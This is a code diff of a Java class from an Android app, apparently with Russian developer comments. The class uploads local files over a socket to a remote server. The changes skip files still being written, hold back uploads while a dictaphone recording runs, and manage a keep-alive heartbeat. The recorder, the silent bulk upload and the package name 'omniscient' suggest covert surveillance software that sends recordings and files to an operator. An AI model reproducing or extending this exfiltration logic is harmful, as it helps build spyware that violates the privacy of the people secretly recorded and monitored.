@@ -2,6 +2,7 @@ package com.postal.omniscient.postal.downloadFiles;
 
 import android.util.Log;
 
+import com.postal.omniscient.postal.ThreadIsAliveOrNot;
 import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
 import com.postal.omniscient.postal.adapter.EventBusData;
 
@@ -48,8 +49,10 @@ public class SendFileToServer extends Thread {
                 for (File inFiles_in : files) {
                     if (inFiles_in.isFile()) {
                         Log.i(Msg, "is file " + inFiles_in.toString());
-                        //файлы отправляются если существуют )
-                        send(inFiles_in.getName().toString(), directory.getName().toString(), inFiles_in.toString());
+                        //файлы отправляются если существуют ) если файл еще пишется пропускаем его!
+                        if(!(inFiles_in.getName().toString()).startsWith("no_written")) {
+                            send(inFiles_in.getName().toString(), directory.getName().toString(), inFiles_in.toString());
+                        }
                     }
                 }
             }
@@ -65,12 +68,12 @@ public class SendFileToServer extends Thread {
             BufferedInputStream bis = new BufferedInputStream(new FileInputStream(patch));
             long expect = myFile.length();
 
-            byte[] buffer = new byte[socket.getSendBufferSize()];
+            byte[] buffer = new byte[1024*8];//socket.getSendBufferSize()];
 
             dos.writeUTF(file_Name);
             dos.writeUTF(folder_Name);
             dos.writeLong(expect);
-
+            Log.i("MyMsg", "File  "+file_Name+" Bite "+expect);
             long left = expect;
             int inlen = 0;
             while (left > 0 && (inlen = bis.read(buffer, 0, (int)Math.min(left, buffer.length))) >= 0) {
@@ -88,14 +91,20 @@ public class SendFileToServer extends Thread {
     public void run() {
         Log.i(Msg, "TRANSFER TREE START");
         is_downloadFlag.setTreadIsWork(true);// не отсылать бин инфы на сервер для поддержания конекта
-        sendData();
 
+        //когда диктофон не работает можно отправлять данные (что бы не отправлять запись во время записи)
+        //на DictaphoneRecordStop потомучто DictaphoneRecord не работает во время записи
+       // if(!new ThreadIsAliveOrNot("DictaphoneRecordStop").liveORnot()) {
+            sendData();
+        //}
         is_downloadFlag.setTreadIsWork(false);
         //начать отсылку битов для поддержки конекта
 //если не работает кип конекшн
         try {
-            dos.writeUTF("isConnect");
-            dos.flush();
+            if(!new ThreadIsAliveOrNot("KeepConnection").liveORnot()) {
+                dos.writeUTF("isConnect");
+                dos.flush();
+            }
         } catch (IOException e) {
             e.printStackTrace();
         }
